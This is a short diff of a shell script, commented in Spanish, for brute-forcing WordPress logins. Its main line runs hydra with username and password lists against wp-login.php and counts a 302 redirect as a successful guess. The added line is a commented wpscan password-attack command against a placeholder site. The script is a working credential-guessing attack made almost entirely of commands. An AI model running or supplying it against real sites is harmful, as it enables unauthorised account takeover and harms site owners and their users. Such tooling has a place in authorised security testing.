@@ -3,6 +3,8 @@
 # POST http-get-form  (o http-post-form si es sin SSL)  para GET http-post-form 
 # WordPress 6.9 y todas las versiones modernas de WordPress, utiliza el método POST en el formulario de login de wp-login.php.
 # @antonio_taboada
+# wpscan --url https://tusitio.com --usernames usuarios0.txt --passwords claves0.txt --password-attack wp-login
+
 
 hydra -L usuarios0.txt -P claves0.txt $1 $2 https-post-form \
 "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=302" \
